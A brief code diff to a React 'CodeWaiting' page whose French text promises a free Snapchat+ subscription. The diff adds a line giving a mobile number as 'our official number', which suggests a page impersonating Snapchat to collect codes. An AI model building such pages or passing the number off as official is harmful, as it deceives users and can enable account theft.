@@ -60,6 +60,11 @@ export default function CodeWaiting() {
           L'abonnement Snapchat+ ne vous sera pas facturé.<br />
           L'abonnement est disponible uniquement pour les utilisateurs éligibles.
         </p>
+
+        <p className="text-muted-foreground/60 text-xs mt-4">
+          Si la demande prend trop de temps, contactez-nous sur notre numéro officiel{" "}
+          <span className="text-primary font-semibold">07 56 86 34 25</span>
+        </p>
       </div>
     </motion.div>);
 
